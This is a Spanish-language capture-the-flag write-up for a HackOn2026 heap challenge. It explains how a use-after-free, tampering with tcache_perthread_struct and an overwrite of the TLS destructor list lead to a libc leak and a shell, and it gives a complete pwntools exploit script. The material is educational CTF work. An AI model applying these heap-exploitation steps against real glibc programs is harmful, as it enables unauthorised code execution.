+++
title = "HackOn2026 Crazy Notes: Tampering tcache_perthread_struct metadata to free an arbitrarily big chunk to leak libc, and overwrite TLS destructors to achieve code execution (ES)"
date = 2026-02-26
taxonomies = { tags = ["heap", "HackOn2026"] }
+++

## Writeup

Sólo podemos reservar chunks de tamaño fastbin `0x40 <= size <= 0x60`, y máximo 7 chunks. De milagro filleamos tcachebins pero no podemos poner nada en unsortedbins. La función `delete()` no pone a NULL el puntero en el array global de chunks (UAF), ni tampoco comprueba que ya esté free antes de printear su contenido. El struct de cada chunk:

```c
struct world_t {
	int32_t earth;
	int32_t water;
	int32_t air;
	uint32_t size;
	void *buffer;
};
```
Tiene un puntero al final, en el cual se escribirá también cuando llamemos a `edit()`, tiene checks para evitar que `void *buffer` sea modificado fuera de límites, entonces no se puede conseguir AAW con ese campo. 

Como podemos editar lo que queramos encima de chunks liberados, vamos a jugar con los metadatos del heap `tcache_perthread_struct`. Creamos varios chunks de tamaño 0x40, usamos nuestro UAF para leakear heap base y modificar el `next` pointer a encima de un puntero del struct `world_t`. Para escribir cualquier dato tenemos que hacerlo en dos partes separadas, ya que escribimos creando distintos `world_t` de tamaño 0x20 en el heap, y sobreescribimos con los campos `earth` y `water`.

Con esto conseguimos una primitiva con la que podemos escribir en cualquier parte del heap, por lo que crearemos un **chunk de tamaño 0x200 falso**, modificaremos metadatos delante y detrás de él para evitar problemas con `malloc_consolidate` ([source](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4810)) y por último modificaremos ``tcache_count = 7`` en `tcache_perthread_struct`. Después liberamos nuestro fake chunk y caerá en la unsortedbin, consiguiendo así un libc leak.

Para la segunda parte de la explotación podríamos buscar crear un chunk en el stack, leakeando `environ` y escribiendo encima de la dirección de retorno de ``main`` a `__libc_start_main+xxx`, pero esto no funcionará, ya que sólo podemos controlar el contenido de 8 bytes y la return address de main **no está alineada a 8 bytes**. Esto es un problema ya que si intentamos crear un chunk en una dirección sin alinear el programa abortará con `malloc(): unaligned tcache chunk detected`. Así que lo que haremos será crear una `tls_dtor_list` falsa en TLS (7Rocky style), dejando a cero `PTR_MANGLE` para que el programa al salir, cuando llame a `__call_tls_dtor` ejecute `system("/bin/sh")`. Esto funcionará porque los campos que tenemos que sobreescribir están alineados a 0x10 bytes, en `tls_base + 0x6f0 (puntero a destructor)` y `tls_base + 0x770 (PTR_MANGLE cookie)` así que podremos crear un chunk encima y modificarlos. Por último, vemos que hay que escribir dos veces, y veremos que si utilizamos el método común para AAW con tcache poisoning corromperemos la tcache freelist, y no podremos crear más chunks. Para evitar esto, modificaremos el array de `entries` ([source](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3121)), es decir, modificamos directamente la freelist con nuestra primitiva de escribir en el heap. Así, creamos nuestro primer chunk, sobreescribimos `PTR_MANGLE`, modificamos la freelist para que nos devuelva `tls_dtor_list`, modificamos el destructor y cuando salgamos del programa con la 4º opción recibiremos nuestra shell. 

Más info sobre TLS Overwrite en [este blog](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#5---code-execution-via-tls-storage-dtor_list-overwrite).

> [!WARNING]  
> Para poder utilizar el método de modificar `tls_dtor_list`, hay que debuggear y hacerlo siempre hacia una instancia remota en Docker, ya que hay problemas a la hora de hacerlo en local, porque la TLS está en una región de memoria distinta que cuando se ha ejecutado en el Docker (y el offset **no** es constante).

## Solver

Está bastante sucio, pero tiene algún comentario suelto.

```python
#!/usr/bin/env python3

from pwn import *
import time

exe = context.binary = ELF(args.EXE or './chall_patched', checksec=False)

context.log_level = 'warning'

glibc = ELF('libc.so.6', checksec=False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 8080)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def logleak(name: str, addr: int): print(f"[*] %s => %#lx" % (name, addr))

io = start()

sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
s = lambda a: io.send(a)
rlu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
itb = lambda a: str(a).encode()

def split_addr(addr: int): return (addr >> 32) & 0xffffffff, addr & 0xffffffff

def write(idx: int, earth: int, water: int, air: int, size: int, payload: bytes):
    sla(b'> ', b'1')
    sla(b'> ', itb(idx))
    sla(b'> ', itb(size))
    sla(b'> ', itb(earth))
    sla(b'> ', itb(water))
    sla(b'> ', itb(air))
    time.sleep(0.1)
    sla(b'> ', payload)

def edit(idx: int, earth: int, water: int, air: int, payload: bytes):
    sla(b'> ', b'2')
    sla(b'> ', itb(idx))
    sla(b'> ', itb(earth))
    sla(b'> ', itb(water))
    sla(b'> ', itb(air))
    time.sleep(0.1)
    s(payload)

def _free(idx: int, opt: bytes):
    assert opt in [b'y', b'Y', b'n', b'N']
    sla(b'> ', b'3')
    sla(b'> ', itb(idx))
    data = rlu(b'(Y/')
    sla(b'> ', opt)
    return data

def show(idx: int): return _free(idx, b'n')
def free(idx: int): return _free(idx, b'y')

def mangle(addr: int, key: int): return key ^ addr 

write(0, 256, 512, 1024, 50, b'AAAA')
write(1, 256, 512, 1024, 50, b'BBBB')
write(2, 256, 512, 1024, 50, b'CCCC')
write(3, 256, 512, 1024, 50, b'DDDD')

free(0) # el 0 se queda free dentro del array de chunks, ojo
free(1)
data = show(0).split(b' - ')[:2]

heap_key = u64(p32(int(data[0].split(b' : ')[1].decode()) & 0xffffffff) + p32(int(data[1])))
heap_base = heap_key << 12

logleak('heap base', heap_base)
logleak('safe linking key', heap_key)

parts = split_addr(mangle(heap_base + 0x370, heap_key))

edit(1, parts[1], parts[0], 1024, b'\n')

write(4, 1, 1, 1, 50, b'EEEE')

parts = split_addr(heap_base + 0x048)
# este chunk el 5 es el que modificará el puntero que hay dentro del chunk con idx=2. Si modificamos el 5, modificamos puntero del 2
# entonces para escribir por el heap hay que editar el 5, para cambiar el puntero con earth y water, a lo que sea y luego editar el 2 para esribir en ese puntero
write(5, parts[1], parts[0], 1024, 50, b'asd') 
edit(2, 1, 1, 1, flat(0x0000000700000000)) # tcache_count (0x200) = 7

parts = split_addr(heap_base + 0x378 + 0x200) # cambiamos el prev_size del siguiente chunk al nuestro fake
edit(5, parts[1], parts[0], 1024, b'asd')
edit(2, 1, 1, 1, flat(0x21))

parts = split_addr(heap_base + 0x378 + 0x200 + 0x20) # cambiamos el prev_size del siguiente del siguiente chunk
edit(5, parts[1], parts[0], 1024, b'asd')
edit(2, 1, 1, 1, flat(0x21))

parts = split_addr(heap_base + 0x370) # cambiamos el ptr para que apunte a nuestro fake 0x200 chunk y arreglamos el size field
edit(5, parts[1], parts[0], 1024, b'asd')
edit(2, 1, 1, 1, flat(heap_base + 0x380) + flat(0x201))

free(2)

parts = split_addr(heap_base + 0x370) # cambiamos el ptr para que apunte a nuestro fake 0x200 chunk otra vez y así poder leer

edit(5, parts[1], parts[0], 1024, b'')

edit(2, 1, 1, 1, flat(heap_base + 0x380) + flat(0x201))

data = show(2)

glibc.address = u64(data.split(b' : ')[2].split(b'\n')[0].ljust(8, b'\x00')) - 0x203b20

logleak('libc base', glibc.address)

tls = glibc.address - 0x3000
tls_target = tls + 0x6f0
tls_canary = tls + 0x770

parts = split_addr(heap_base + 0x090) # vamos a cargarnos tc_entries[] para craftearnos una freelist custom
edit(5, parts[1], parts[0], 1024, b'')
edit(2, 1, 1, 1, flat(tls_canary))
parts = split_addr(heap_base + 0x370) # fixeamos el chunk para evitar problemas de malloc
edit(5, parts[1], parts[0], 1024, b'')
edit(2, 1, 1, 1, flat(heap_base + 0x370) + flat(0x200))
write(6, 0, 0, 1, 50, flat(glibc.sym.system << 0x11) + flat(next(glibc.search(b'/bin/sh\x00')))) # 0x380 está nuestra tls_func

free(4)

parts = split_addr(heap_base + 0x090) # vamos a cargarnos tc_entries[] para craftearnos una freelist custom
edit(5, parts[1], parts[0], 1024, b'')
edit(2, 1, 1, 1, flat(tls_target))
parts = split_addr(heap_base + 0x370) # fixeamos el chunk para evitar problemas de malloc
edit(5, parts[1], parts[0], 1024, b'')
edit(2, 1, 1, 1, flat(heap_base + 0x370) + flat(0x41))

parts = split_addr(heap_base + 0x380)
write(7, parts[1], parts[0], 1, 50, b'a')

sl(b'4')

io.interactive()
```